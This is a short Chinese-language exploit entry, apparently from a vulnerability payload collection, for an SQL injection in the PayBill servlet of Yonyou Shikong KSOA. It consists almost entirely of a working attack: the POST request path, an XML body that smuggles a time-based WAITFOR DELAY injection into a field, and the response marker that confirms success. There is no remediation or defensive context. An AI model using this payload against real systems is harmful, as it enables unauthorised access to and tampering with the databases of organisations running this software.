# 用友时空KSOAPayBillSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /servlet/PayBill?caculate&_rnd= HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:05';-</name><name>1</name><name>102360</name></root>
```
- **响应特征**：-1